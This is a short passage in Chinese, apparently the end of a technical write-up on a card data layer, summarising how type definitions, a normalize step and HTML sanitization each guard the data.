     → blocks_to_text() 派生 body
```

一句话总结这一层：**类型定义"有哪些字段"，normalize 决定"这些字段能装什么"，
sanitize 决定"这些 HTML 能留下什么"**——三件事各守一关，卡片的数据才既好用又安全。
